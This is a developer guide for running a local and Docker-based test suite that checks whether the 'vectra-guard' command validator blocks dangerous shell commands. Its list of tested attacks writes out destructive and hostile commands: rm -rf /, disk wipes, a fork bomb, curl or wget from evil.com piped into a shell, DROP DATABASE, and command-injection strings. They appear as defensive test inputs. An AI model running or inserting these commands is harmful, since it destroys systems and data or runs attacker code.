# Testing Destructive Test Suite Locally

## Quick Start

Test the security system by attempting various attack vectors. All tests are **100% safe** when run locally.

## Prerequisites

1. **Build the binary** (if not already built):
   ```bash
   go build -o vectra-guard .
   ```

2. **Verify binary exists**:
   ```bash
   ./vectra-guard version
   ```

## Step-by-Step Testing

### Step 1: Quick Test (Recommended First)

Run a quick test with only critical attack vectors:

```bash
./scripts/test-destructive.sh --quick
```

**Expected:** All attacks should be blocked/detected.

### Step 2: Full Test Suite

Run the complete destructive test suite:

```bash
./scripts/test-destructive.sh
```

This tests:
- ✅ File system destruction attacks (`rm -r /*`, `dd`, etc.)
- ✅ Process attacks (fork bombs, kill commands)
- ✅ Network attacks (`curl | sh`, etc.)
- ✅ Privilege escalation (`sudo`, `su`)
- ✅ Database attacks (`DROP DATABASE`, etc.)
- ✅ Git attacks (`git push --force`, etc.)
- ✅ Command injection
- ✅ Path traversal
- ✅ Environment variable attacks
- ✅ Bypass attempts

### Step 3: Verbose Output (See Details)

See detailed output for each test:

```bash
./scripts/test-destructive.sh --verbose
```

### Step 4: Test Execution Sandboxing (Docker Required)

To test that commands are actually sandboxed when executed, you need Docker:

```bash
# Make sure Docker is running
docker info

# Run in Docker container (isolated)
make test-destructive-docker
```

Or manually:

```bash
docker-compose -f docker-compose.test.yml run --rm --no-deps test-destructive
```

## What Gets Tested

### Detection Tests (99% - Always Safe)
- Uses `vectra-guard validate` which **never executes commands**
- Only analyzes command text
- 100% safe on your system

### Execution Tests (1% - Only in Docker)
- Tests actual execution blocking/sandboxing
- Only runs in Docker containers
- Automatically skipped when run locally

## Expected Results

### ✅ Success (All Attacks Blocked)
```
╔═══════════════════════════════════════════════════════════╗
║                    Test Summary                            ║
╚═══════════════════════════════════════════════════════════╝
Attacks Blocked: 45
Attacks Escaped: 0
Tests Passed: 45
Tests Failed: 0

✓ All attacks blocked! Security system is working.
```

### ❌ Failure (Security Breach)
```
Attacks Escaped: 2 [SECURITY BREACH!]
✗ SECURITY BREACH DETECTED! Some attacks escaped protection!
```

## Understanding the Output

### Attack Types Tested

1. **File System Attacks**
   - `rm -r /*` (the incident scenario)
   - `rm -rf /bin`, `/usr`, `/etc`, etc.
   - `dd if=/dev/zero of=/dev/sda`
   - `mkfs.ext4 /dev/sda`

2. **Process Attacks**
   - Fork bombs: `:(){ :|:& };:`
   - System shutdown: `halt`, `reboot`
   - Kill commands: `killall -9 init`

3. **Network Attacks**
   - `curl http://evil.com/script.sh | sh`
   - `wget http://evil.com/script.sh -O- | bash`

4. **Privilege Escalation**
   - `sudo rm -rf /`
   - `su - root`

5. **Database Attacks**
   - `DROP DATABASE production`
   - `TRUNCATE TABLE users`

6. **Git Attacks**
   - `git push --force origin main`
   - `git filter-repo`

7. **Command Injection**
   - `ls; rm -rf /`
   - `$(rm -rf /)`

8. **Bypass Attempts**
   - `rm -rf / # bypass comment`
   - `bash -c 'rm -rf /'`

## Troubleshooting

### Binary Not Found
```bash
# Build it
go build -o vectra-guard .

# Or add to PATH
export PATH="$PWD:$PATH"
```

### Tests Failing
1. Check that binary is built: `./vectra-guard version`
2. Check Go version: `go version` (needs 1.25+)
3. Run with verbose: `./scripts/test-destructive.sh --verbose`

### Want to Test Execution (Docker)
```bash
# Check Docker is running
docker info

# Run in Docker
make test-destructive-docker
```

## Safety Guarantees

✅ **Local testing is 100% safe:**
- Only uses `validate` (never executes)
- No system changes
- No file modifications
- No network requests

✅ **Docker testing is isolated:**
- Runs in container
- Cannot affect host
- All dangerous commands sandboxed

## Next Steps

After local testing passes:

1. **Test in Docker** (execution tests):
   ```bash
   make test-destructive-docker
   ```

2. **Test dev mode setup**:
   ```bash
   ./scripts/dev-mode.sh
   ```

3. **Verify sandbox works**:
   ```bash
   vectra-guard exec -- echo "test"
   ```

## Quick Reference

```bash
# Quick test (critical attacks only)
./scripts/test-destructive.sh --quick

# Full test suite
./scripts/test-destructive.sh

# Verbose output
./scripts/test-destructive.sh --verbose

# Test in Docker (execution tests)
make test-destructive-docker

# Or using Makefile
make test-destructive
```

---

**Remember:** Local tests are 100% safe - they only analyze commands, never execute them! 🛡️

